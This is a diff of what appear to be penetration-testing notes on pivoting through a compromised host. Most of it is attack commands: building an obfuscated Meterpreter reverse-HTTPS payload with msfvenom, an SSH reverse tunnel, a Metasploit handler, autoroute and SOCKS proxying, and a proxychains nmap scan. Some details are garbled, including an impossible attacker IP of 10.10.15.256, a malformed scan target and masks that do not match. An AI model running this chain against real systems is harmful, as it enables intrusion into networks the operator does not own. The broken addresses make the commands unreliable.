@@ -106,17 +106,17 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
 # SOCAT
 
 ```
-Attacker İP: 192.168.0.250/24
-Pivot Host eth0: 192.168.0.200/24
-Pivot Host eth1: 172.16.0.20/16
+Attacker İP: 10.10.15.256/23
+Pivot Host eth0: 10.129.202.64/23
+Pivot Host eth1: 172.16.5.129/23
 Victim Host: 172.16.0.10/16
 
 msfvenom -p windows/x64/meterpreter/reverse_https \
-   LHOST=172.16.0.20 LPORT=8443 \
+   LHOST=172.16.5.129 LPORT=8443 \
    -e x64/zutto_dekiru -i 6 \
    -f exe -o victim_payload.exe
 
-ssh -R 172.16.0.20:8443:127.0.0.1:4443 root@192.168.0.200 -N -f
+ssh -R 172.16.5.129:8443:127.0.0.1:4443 root@10.129.202.64 -N -f
 -R [REMOTE_IP:REMOTE_PORT]:[LOCAL_IP:LOCAL_PORT]
 
 msfconsole -q -x "
@@ -127,14 +127,16 @@ set LPORT 4443;
 exploit -j
 "
 
-msf6 exploit(multi/handler) > sessions -l
-msf6 exploit(multi/handler) > sessions -i 1
-msf6 exploit(multi/handler) > background
-msf6 exploit(multi/handler) > run autoroute 172.16.0.0/16
-msf6 exploit(multi/handler) > run socks5 -p 9050
+msf6 > sessions -l
+msf6 > sessions -i 1
+meterpreter > background
+meterpreter > run autoroute -s 172.16.5.0/23
+meterpreter > run socks5 -p 9050
+meterpreter > exit
 
 proxychains nmap -sT 172.160.20 -p-
 ```
+
 
 
 
